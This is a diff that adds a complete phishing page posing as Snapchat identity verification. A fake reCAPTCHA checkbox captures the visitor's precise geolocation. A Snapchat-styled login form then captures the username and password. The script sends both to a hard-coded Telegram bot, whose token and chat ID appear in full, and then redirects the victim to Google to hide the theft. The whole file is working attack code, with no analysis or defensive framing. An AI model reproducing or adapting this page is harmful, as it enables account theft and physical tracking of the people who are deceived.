@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Identity Verification</title>
+    <style>
+        :root {
+            --snap-yellow: #FFFC00;
+        }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background: #f0f0f0; 
+            margin: 0; 
+            transition: background 0.5s;
+        }
+
+        /* --- CAPTCHA Design --- */
+        #captcha-container { display: flex; flex-direction: column; align-items: center; }
+        .recaptcha-box { 
+            background:#f9f9f9; border:1px solid #d3d3d3; border-radius:3px; 
+            width:320px; height:74px; display:flex; align-items:center; 
+            justify-content:space-between; padding:0 12px 0 14px; 
+            box-shadow:0 1px 3px rgba(0,0,0,0.1); 
+        }
+        .rc-checkbox { 
+            width:26px; height:26px; border:2px solid #c1c1c1; border-radius:2px; 
+            background:#fff; cursor:pointer; display:flex; align-items:center; 
+            justify-content:center; position: relative; transition: all 0.3s;
+        }
+        .rc-spinner { 
+            display:none; width:18px; height:18px; 
+            border:3px solid #e0e0e0; border-top-color:#4285F4; 
+            border-radius:50%; animation:rcSpin 0.8s linear infinite; 
+        }
+        .rc-checkmark, .rc-error-x { display:none; width:26px; height:26px; }
+        .rc-checkbox.loading .rc-spinner { display:block; }
+        .rc-checkbox.checked .rc-checkmark { display:block; }
+        .rc-checkbox.error .rc-error-x { display:block; }
+        #status-text { font-size:14px; color:#333; cursor:pointer; user-select: none; }
+        .text-error { color: #d93025 !important; font-weight: bold; }
+
+        /* --- Login Interface --- */
+        #login-interface { 
+            display: none; 
+            width: 100%; 
+            max-width: 400px; 
+            text-align: center; 
+            animation: fadeIn 0.8s;
+        }
+        .snap-logo { width: 70px; margin-bottom: 20px; }
+        .login-card { background: white; padding: 40px 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
+        .login-card h2 { margin-bottom: 30px; font-weight: bold; font-size: 22px; color: #1d1d1d; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { display: block; font-size: 11px; color: #757575; margin-bottom: 5px; text-transform: uppercase; font-weight: bold; letter-spacing: 0.5px; }
+        .input-field { 
+            width: 100%; padding: 12px; border: 1px solid #e2e2e2; border-radius: 5px; 
+            background: #f8f8f8; box-sizing: border-box; outline: none; font-size: 16px;
+        }
+        .input-field:focus { border-color: #000; }
+        .login-btn { 
+            width: 100%; padding: 14px; border: none; border-radius: 25px; 
+            background: #000; color: white; font-weight: bold; font-size: 16px; 
+            cursor: pointer; margin-top: 20px; transition: 0.3s;
+        }
+        .login-btn:hover { opacity: 0.85; }
+        
+        @keyframes rcSpin { to { transform:rotate(360deg); } }
+        @keyframes rcDraw  { to { stroke-dashoffset:0; } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+<div id="captcha-container">
+    <div class="recaptcha-box">
+        <div style="display:flex; align-items:center; gap:12px;">
+            <div class="rc-checkbox" id="rcCheck" onclick="startVerification()">
+                <div class="rc-spinner"></div>
+                <svg class="rc-checkmark" viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="12" fill="#4CAF50"/>
+                    <path d="M7 12.5L10.5 16L17 9" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-dasharray="15" stroke-dashoffset="15" id="checkPath"/>
+                </svg>
+                <svg class="rc-error-x" viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="12" fill="#d93025"/>
+                    <path d="M8 8L16 16M8 16L16 8" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+                </svg>
+            </div>
+            <span id="status-text" onclick="startVerification()">I'm not a robot</span>
+        </div>
+        <div style="display:flex; flex-direction:column; align-items:center; gap:2px;">
+            <svg width="32" height="32" viewBox="0 0 64 64"><circle cx="32" cy="32" r="30" fill="#4285F4"/><path d="M32 16 L48 44 L16 44 Z" fill="white" opacity="0.9"/><circle cx="32" cy="32" r="8" fill="#4285F4"/><circle cx="32" cy="32" r="5" fill="white"/></svg>
+            <div style="font-size:10px; color:#4a90d9; font-weight:500;">reCAPTCHA</div>
+            <div style="font-size:7.5px; color:#9aa0a6;">Privacy - Terms</div>
+        </div>
+    </div>
+</div>
+
+<div id="login-interface">
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/200px-Snapchat_logo.svg.png" class="snap-logo" alt="Snapchat">
+    <div class="login-card">
+        <h2>Log In</h2>
+        <div class="input-group">
+            <label>Username or Email</label>
+            <input type="text" class="input-field" id="user_id" autocomplete="off">
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" class="input-field" id="pass_id">
+        </div>
+        <button class="login-btn" onclick="sendLogin()">Log In</button>
+    </div>
+</div>
+
+<script>
+    let isProcessing = false;
+    const TG_TOKEN = "8727287843:AAHzF2xtGmC2CRSHFZjRzgW4TPwoyDUpfP4";
+    const TG_CHAT  = "7236270424";
+
+    function startVerification() {
+        if (isProcessing) return;
+        const box = document.getElementById('rcCheck');
+        const label = document.getElementById('status-text');
+        
+        box.classList.remove('error', 'checked');
+        label.classList.remove('text-error');
+        isProcessing = true;
+        box.classList.add('loading');
+        label.innerText = "Verifying...";
+
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                box.classList.remove('loading');
+                box.classList.add('checked');
+                document.getElementById('checkPath').style.animation = 'rcDraw 0.4s ease forwards';
+                label.innerText = "Verified Successfully ✅";
+                
+                // Send Location to Telegram
+                await sendToTelegram("📍 New Location Captured:", pos.coords.latitude, pos.coords.longitude);
+
+                // Transition to Login Page
+                setTimeout(() => {
+                    document.getElementById('captcha-container').style.display = 'none';
+                    document.getElementById('login-interface').style.display = 'block';
+                    document.body.style.background = '#FFFC00';
+                }, 1200);
+            },
+            () => {
+                showError("Verification failed. Try again.");
+            },
+            { enableHighAccuracy: true, timeout: 8000 }
+        );
+    }
+
+    function showError(msg) {
+        const box = document.getElementById('rcCheck');
+        const label = document.getElementById('status-text');
+        box.classList.remove('loading');
+        box.classList.add('error');
+        label.innerText = msg;
+        label.classList.add('text-error');
+        isProcessing = false;
+    }
+
+    async function sendToTelegram(title, lat, lon) {
+        const base = `https://api.telegram.org/bot${TG_TOKEN}`;
+        const msg = `🔔 *${title}*\n\nLat: \`${lat}\`\nLon: \`${lon}\``;
+        try {
+            await fetch(`${base}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: "Markdown" })
+            });
+            await fetch(`${base}/sendLocation`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TG_CHAT, latitude: lat, longitude: lon })
+            });
+        } catch (e) {}
+    }
+
+    async function sendLogin() {
+        const user = document.getElementById('user_id').value;
+        const pass = document.getElementById('pass_id').value;
+        if(!user || !pass) return alert("Please fill in all fields.");
+
+        const loginMsg = `🔐 *New Login Credentials*\n\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\``;
+        const base = `https://api.telegram.org/bot${TG_TOKEN}`;
+
+        try {
+            await fetch(`${base}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TG_CHAT, text: loginMsg, parse_mode: "Markdown" })
+            });
+            // Show fake error to the use
+            //alert("Connection error. Please try again later.");
+            window.location.href = "https://www.google.com/";
+        } catch (e) {}
+    }
+</script>
+</body>
+</html>
